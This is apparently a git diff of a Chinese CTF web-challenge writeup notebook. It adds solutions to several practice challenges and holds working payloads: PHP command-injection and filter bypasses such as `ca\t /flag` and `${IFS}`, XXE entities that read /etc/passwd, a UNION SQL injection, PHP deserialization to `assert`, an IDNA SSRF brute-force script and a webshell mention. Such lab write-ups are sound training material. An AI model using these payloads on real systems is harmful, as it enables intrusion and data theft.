@@ -1,7 +1,3 @@
-
-
-
-
 # CTF刷题WriteUp
 
 ## WEB
@@ -2529,7 +2525,7 @@ flag.php文件的内容就在the contents of his/her blog中，打开源码
 
 ![image-20210516191332950](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516191332950.png)
 
-### “百度杯”CTF比赛 十二月场——notebook（未解决）
+### “百度杯”CTF比赛 十二月场——notebook(。。。。。)
 
 ![image-20210516193110579](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516193110579.png)
 
@@ -2547,11 +2543,11 @@ flag.php文件的内容就在the contents of his/her blog中，打开源码
 
 此题中存在变量可以被控制，所以直接输入一句话木马被文件包含的时候解析成功，再用蚁剑连接即可
 
-### “迎圣诞，拿大奖”活动赛题“迎圣诞，拿大奖”活动赛题——SQLi
+### “迎圣诞，拿大奖”活动赛题“迎圣诞，拿大奖”活动赛题——SQLi(。。。。。)
 
 ![image-20210517143541651](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210517143541651.png)
 
-### “百度杯”CTF比赛 十月场——Vld
+### “百度杯”CTF比赛 十月场——Vld(。。。。。)
 
 ![image-20210517143704349](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210517143704349.png)
 
@@ -3162,6 +3158,12 @@ https://www.zhaoj.in/read-5873.html#0x02
 
 ![image-20210521222210419](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521222210419.png)
 
+去这个文件里看看。这一段是关键，拼接了一个 System 出来调用 Efa5BVG 这个参数。
+
+`system($_GET['Efa5BVG'])`
+
+![image-20210530163754515](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530163754515.png)
+
 ### [GXYCTF2019]禁止套娃
 
 ![image-20210522155734364](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522155734364.png)
@@ -3211,7 +3213,9 @@ if(isset($_GET['exp'])){
 
 https://www.cnblogs.com/wangtanzhi/p/12260986.html
 
+**本题考查无参数RCE**
 
+`current(localeconv())`永远都是个点
 
 payload:
 
@@ -3221,7 +3225,7 @@ payload:
 
 ![image-20210522164917590](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522164917590.png)
 
-或者
+或者使用session
 
 ![image-20210522165838223](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522165838223.png)
 
@@ -3241,6 +3245,8 @@ payload:
 
 ### [RoarCTF 2019]Easy Java
 
+前置知识：
+
 ~~~
 WEB-INF主要包含一下文件或目录:
 /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
@@ -3249,6 +3255,26 @@ WEB-INF主要包含一下文件或目录:
 /WEB-INF/database.properties：数据库配置文件
 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码
 ~~~
+
+help超链接的源码：
+
+![image-20210530164458018](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530164458018.png)
+
+在url栏上显示了貌似是文件下载，根据java配置文件的目录，咱们可以先去获取web.xml配置文件的信息，修改一下地址，让它指向`/WEB-INF/web.xml`,结果文件还是找不到，抓包把get方法改成了post方法，成功获得web.xml的信息并且看到了flag的路径
+
+![image-20210530165141958](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530165141958.png)
+
+去访问该class文件的路径，获得class文件
+
+![image-20210530165427023](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530165427023.png)
+
+复制出来，咱们用工具反编译一下即可获得java代码
+
+![image-20210530165811478](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530165811478.png)
+
+![image-20210530165944724](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530165944724.png)
+
+**其中，把get方法改成post方法的原因应该是java后台代码中并没有执行doGet()方法，而是在doPost()方法中写的运行代码**
 
 ### [BJDCTF2020]The mystery of ip
 
@@ -3335,7 +3361,7 @@ $_SESSION['id'] = $id;
 
 function complex($re, $str) {
     return preg_replace(
-        '/(' . $re . ')/ei',//两边添加了圆括号
+        '/(' . $re . ')/ei',//两边添加了圆括号，反方引用
         'strtolower("\\1")',
         $str
     );
@@ -3370,6 +3396,18 @@ payload:
 ~~~
 ///next.php?\S*=${getFlag()}&cmd=system('cat /flag');
 ~~~
+
+\S:匹配任何非空白字符。* : 匹配前面的子表达式零次或多次。
+
+\S*: 表示匹配0次或多次的任何非空白符
+
+![image-20210530172314819](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530172314819.png)
+
+成功匹配getFlag（）方法，然后在传递cmd参数为系统命令执行即可
+
+![image-20210530173256220](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530173256220.png)
+
+![image-20210530173312605](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530173312605.png)
 
 ### [BJDCTF2020]Mark loves  cat
 
@@ -3516,9 +3554,67 @@ if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmo
 
 [浅谈md5弱类型比较和强碰撞](https://www.secpulse.com/archives/153442.html)
 
+可以使用 `fastcoll.exe`工具生成两个md5值一样的文件
 
+> 1. 找到一个可执行文件, 我们以它的文件内容为前缀,这里我选择的是windows下的init.txt
+>
+> 2. 打开cmd命令行: fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt  2.txt， 此时生成两个文件1.txt和2.txt,  而此时发现这两个文件都同init.txt一样是可以运行的
 
-![image-20210523161315667](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210523161315667.png)
+![image-20210530181416844](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530181416844.png)
+
+使用MD5验证工具可以看到这两个文件的MD5值是一样的，但是里面的内容却不一样
+
+![image-20210530181740640](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530181740640.png)
+
+使用php脚本查看md5值：
+
+~~~php
+<?php
+function  readmyfile($path){
+    $fh = fopen($path, "rb");
+    $data = fread($fh, filesize($path));
+    fclose($fh);
+    return $data;
+}
+echo '二进制hash '. md5( (readmyfile("1.txt")));
+echo "<br><br>\r\n";
+echo  'URLENCODE '. urlencode(readmyfile("1.txt"));
+echo "<br><br>\r\n";
+echo 'URLENCODE hash '.md5(urlencode (readmyfile("1.txt")));
+echo "<br><br>\r\n";
+echo '二进制hash '.md5( (readmyfile("2.txt")));
+echo "<br><br>\r\n";
+echo  'URLENCODE '.  urlencode(readmyfile("2.txt"));
+echo "<br><br>\r\n";
+echo 'URLENCODE hash '.md5( urlencode(readmyfile("2.txt")));
+echo "<br><br>\r\n";
+~~~
+
+![image-20210530182623686](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530182623686.png)
+
+**这里有个坑，使用burp里的url编码和在线网站的url编码都会导致错误，可能是因为文件里有乱码的原因吧,建议使用php脚本的url编码**
+
+于是咱们把这两个文件里的内容进行url编码使用参数传递即可绕过限制
+
+现在还有一个cmd参数需要传递，很明显就是传递linux命令，但是上面的源码中限制了很多命令，咱们可以使用命令之间+\进行绕过
+
+例如：`ls 、l\s`这两个命令执行的结果是一致的
+
+![image-20210530183824276](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530183824276.png)
+
+所以下一步就是找到flag文件
+
+![image-20210530184018159](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530184018159.png)
+
+payload:
+
+~~~
+/index.php?img=&cmd=ca\t+/flag
+~~~
+
+成功获得flag
+
+![image-20210530184114495](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530184114495.png)
 
 ### 《从0到1：CTFer成长之路》题目——sql注入1
 
@@ -3548,7 +3644,7 @@ if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmo
 
 成功获得flag
 
-### “百度杯”CTF比赛 十二月场——Blog
+### “百度杯”CTF比赛 十二月场——Blog（。。。。）
 
 ![image-20210524111619121](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524111619121.png)
 
@@ -3606,7 +3702,7 @@ http://9a6a9de81cb44dc0ac52841e88c2ce803fdb51883d6b48b3.changame.ichunqiu.com/ki
             die("Hacker...");
         }
     }
-    ?>
+?>
 ~~~
 
 序列化魔术方法：
@@ -3658,9 +3754,33 @@ func=unserialize&p=O:4:"Test":2:{s:1:"p";s:18:"find / -name flag*";s:4:"func";s:
 
 本关卡考察的是XXE
 
+![image-20210531090644239](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531090644239.png)
+
+抓取流量包，发现传输的参数经过了加工变成了xml格式的数据，并且返回的数据包含username值
+
+![image-20210531090940477](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531090940477.png)
+
+怀疑是否存在XXE注入，可以使用外部实体引用的方法，用用户名aa返回想要获得系统信息
+
+payload：
+
+~~~xml-dtd
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE user[
+    <!ENTITY aa SYSTEM "file:///etc/passwd">
+    ]>
+<user><username>&aa;</username><password>aa</password></user><!--注意&aa后面有个分号-->
+~~~
 
 
 
+获取/etc/passwd文件的内容，测试是否存在XXE漏洞
+
+![image-20210531091938329](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531091938329.png)
+
+
+
+获取flag文件的值
 
 ![image-20210524203423276](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524203423276.png)
 
@@ -3668,7 +3788,32 @@ func=unserialize&p=O:4:"Test":2:{s:1:"p";s:18:"find / -name flag*";s:4:"func";s:
 
 ![image-20210524203643801](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524203643801.png)
 
-### [De1CTF 2019]SSRF Me
+**外部实体示例代码：**
+
+```xml-dtd
+<?xml version = "1.0" encoding = "utf-8"?>
+<!DOCTYPE author [
+    <!ENTITY file SYSTEM "file:///etc/passwd">
+    <!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
+]>
+<author>&file;©right;</author>
+```
+
+外部实体可支持http、file等协议。不同程序支持的协议不同：
+
+![img](CTF%E5%88%B7%E9%A2%98WriteUp.assets/20191202150935-b26e4a30-14d2-1.png)
+
+PHP引用外部实体，**常见的利用协议**：
+
+```
+file://文件绝对路径 如：file:///etc/passwd
+http://url/file.txt
+php://filter/read=convert.base64-encode/resource=xxx.php
+```
+
+
+
+### [De1CTF 2019]SSRF Me（。。。。）
 
 ![image-20210525172355395](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210525172355395.png)
 
@@ -3857,10 +4002,37 @@ if(!isset($_GET['c'])){
 
 ~~~
 
-看完代码没有思路，看看别人的WP,利用的是进制之间的转换构造函数
+传递一个参数c，对传递的内容用正则进行了限制字符和函数，只能使用给定的白名单函数来绕过限制，执行咱们想执行的命令，也就是cat /flag
+
+如果没有任何限制的话，传递的参数应是：
 
 ~~~
-c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&pi=system&abs=cat /flag
+?c=${system($_GET['p'])}&p=cat /flag  或者
+?c=$_GET['cmd']($_GET['p'])&cmd=system&p=cat /flag
+~~~
+
+由于做了函数白名单限制，我们可以使用进制转换进行绕过
+
+把_GET使用base_convert()函数由36进制变成10进制的数字，但是这样好像行不通，因为`_`符号无法用36进制表示出来，所以我们先获取hex2bin()函数，这个函数的作用是把16进制转换成字符串。
+
+接下来就是构造_GET的16进制:5f474554
+
+但是传递的参数内容不能有引号，所以还要把_GET的16进制字符串转换成10进制数字
+
+hexdec('5f474554'):1598506324，所以`base_convert(37907361743,10,36)(dechex(1598506324))`-->`_GET`
+
+_GET构造出来了，接下来就是传递参数了,上述代码限制了`[]`中括号，咱们可以使用`{}`花括号绕过，而其中的pi、abs变量名也是上面白名单中的数学函数，这样才能绕过限制
+
+~~~
+?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&pi=system&abs=cat /flag
+~~~
+
+![image-20210531103458852](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531103458852.png)
+
+看看别人的WP,利用的是进制之间的转换构造函数
+
+~~~
+?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&pi=system&abs=cat /flag
 ~~~
 
 ### [BSidesCF 2020]Had a bad day
@@ -3934,7 +4106,7 @@ c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&pi
 
 ![image-20210526145429829](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526145429829.png)
 
-### [安洵杯 2019]easy_serialize_php
+### [安洵杯 2019]easy_serialize_php（。。。。。）
 
 ~~~php
  <?php
@@ -4005,7 +4177,7 @@ def getUrl():
         return "我扌 your problem? 222 " + host
     newhost = []
     for h in host.split('.'): #使用. 分割host
-        newhost.append(h.encode('idna').decode('utf-8'))//漏洞，是Unicode编码的字符等同与utf-8
+        newhost.append(h.encode('idna').decode('utf-8'))#漏洞，使Unicode编码的字符等同与utf-8
     parts[1] = '.'.join(newhost)
     #去掉 url 中的空格
     finalUrl = urlunsplit(parts).split(' ')[0]
@@ -4032,11 +4204,60 @@ def getUrl():
 > c/u
 > 通过这种方法可以绕过网站的一些过滤字符
 
+所以咱们可以使用python脚本去爆破一下经过idna编码和utf-8解码之后的成功显示suctf.cc主机的Unicode编码
+
+~~~python
+from urllib.parse import urlparse, urlunsplit, urlsplit
+from urllib import parse
 
 
+def get_unicode():
+    for x in range(65536):
+        uni = chr(x)
+        url = f"http://{uni}uctf.cc"
+        try:
+            if getUrl(url):
+                print("str: " + uni + ' unicode: \\u' + str(hex(x))[2:])
+        except:
+            pass
 
 
+def getUrl(url):
+    url = url
+    host = parse.urlparse(url).hostname
+    if host == 'suctf.cc':
+        return False
+    parts = list(urlsplit(url))
+    host = parts[1]
+    if host == 'suctf.cc':
+        return False
+    newhost = []
+    for h in host.split('.'):
+        newhost.append(h.encode('idna').decode('utf-8'))
+    parts[1] = '.'.join(newhost)
+    finalUrl = urlunsplit(parts).split(' ')[0]
+    host = parse.urlparse(finalUrl).hostname
+    if host == 'suctf.cc':
+        return True
+    else:
+        return False
 
+
+if __name__ == '__main__':
+    get_unicode()
+~~~
+
+![image-20210531105549456](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531105549456.png)
+
+复制Unicode编码去https://graphemica.com/查询url编码
+
+然后用file协议去获取Nginx配置文件的信息
+
+![image-20210531110316539](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531110316539.png)
+
+知道了flag文件的位置在/usr/fffffflag
+
+![image-20210531110407088](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531110407088.png)
 
 
 
@@ -4051,3 +4272,189 @@ def getUrl():
 > 程序默认存放位置：/usr/share/nginx/html
 > 日志默认存放位置：/var/log/nginx
 > 配置文件目录为：/usr/local/nginx/conf/nginx.conf
+
+### [WUSTCTF2020]朴实无华
+
+~~~php
+<?php
+header('Content-type:text/html;charset=utf-8');
+error_reporting(0);
+highlight_file(__file__);
+
+
+//level 1
+if (isset($_GET['num'])){
+    $num = $_GET['num'];
+    if(intval($num) < 2020 && intval($num + 1) > 2021){
+        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
+    }else{
+        die("金钱解决不了穷人的本质问题");
+    }
+}else{
+    die("去非洲吧");
+}
+//level 2
+if (isset($_GET['md5'])){
+   $md5=$_GET['md5'];
+   if ($md5==md5($md5))
+       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
+   else
+       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
+}else{
+    die("去非洲吧");
+}
+
+//get flag
+if (isset($_GET['get_flag'])){
+    $get_flag = $_GET['get_flag'];
+    if(!strstr($get_flag," ")){ //过滤了空格
+        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
+        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
+        system($get_flag);
+    }else{
+        die("快到非洲了");
+    }
+}else{
+    die("去非洲吧");
+}
+?> 
+~~~
+
+payload：
+
+~~~
+?num=2019e2&md5=0e215962017&get_flag=sort${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
+~~~
+
+
+
+![image-20210531150845212](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531150845212.png)
+
+### [SWPU2019]Web1
+
+https://www.jianshu.com/p/dc9af4ca2d06
+
+![image-20210531151756398](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531151756398.png)
+
+![image-20210531153628563](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531153628563.png)
+
+payload：
+
+~~~
+-1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'
+~~~
+
+
+
+![image-20210531155623906](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531155623906.png)
+
+### [0CTF 2016]piapiapia
+
+![image-20210601164508391](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210601164508391.png)
+
+### [NCTF2019]True XML cookbook
+
+考察用xxe去攻击内网
+
+![image-20210601174731955](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210601174731955.png)
+
+~~~php
+<?php
+/**
+* autor: c0ny1
+* date: 2018-2-7
+*/
+
+$USERNAME = 'admin'; //è´¦å·
+$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //å¯ç 
+$result = null;
+
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents('php://input');
+
+try{
+	$dom = new DOMDocument();
+	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+	$creds = simplexml_import_dom($dom);
+
+	$username = $creds->username;
+	$password = $creds->password;
+
+	if($username == $USERNAME && $password == $PASSWORD){
+		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,$username);
+	}else{
+		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,$username);
+	}	
+}catch(Exception $e){
+	$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",3,$e->getMessage());
+}
+
+header('Content-Type: text/html; charset=utf-8');
+echo $result;
+?>
+~~~
+
+https://blog.csdn.net/SopRomeo/article/details/107491606
+
+`file:///etc/hosts`
+
+`file:///proc/net/arp`
+
+![image-20210601185737945](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210601185737945.png)
+
+![image-20210601195954013](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210601195954013.png)
+
+![image-20210601195923391](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210601195923391.png)
+
+
+
+### [NPUCTF2020]ReadlezPHP
+
+
+
+![image-20210601200450785](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210601200450785.png)
+
+~~~php
+<?php
+#error_reporting(0);
+class HelloPhp
+{
+    public $a;
+    public $b;
+    public function __construct(){
+        $this->a = "Y-m-d h:i:s";
+        $this->b = "date";
+    }
+    public function __destruct(){
+        $a = $this->a;
+        $b = $this->b;
+        echo $b($a); //b是传递的方法名，a传递的参数
+    }
+}
+$c = new HelloPhp;
+
+if(isset($_GET['source']))
+{
+    highlight_file(__FILE__);
+    die(0);
+}
+
+@$ppp = unserialize($_GET["data"]);
+
+~~~
+
+看了代码之后很明显要考序列化的知识
+
+system函数被禁用了
+
+payload：
+
+~~~
+/time.php
+?data=O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}
+~~~
+
+![image-20210601203107697](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210601203107697.png)
+
+这道题简单，只需要只要序列化就可以了，没有很绕
+
